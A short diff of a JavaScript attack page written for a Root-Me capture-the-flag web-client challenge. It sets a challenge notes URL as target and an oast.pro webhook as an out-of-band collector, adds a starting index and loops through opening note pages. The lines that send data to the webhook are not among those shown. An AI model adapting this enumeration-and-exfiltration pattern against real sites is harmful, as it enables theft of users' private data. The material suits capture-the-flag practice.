@@ -1,6 +1,7 @@
 <script>
 const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
 const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";
+let i = 1400
 
 function next() {
     const w = window.open(TARGET + i);
@@ -16,10 +17,6 @@ function next() {
         i++;
         next();
     }, 1000);
-}
-
-next();
-
 }
 
 next();
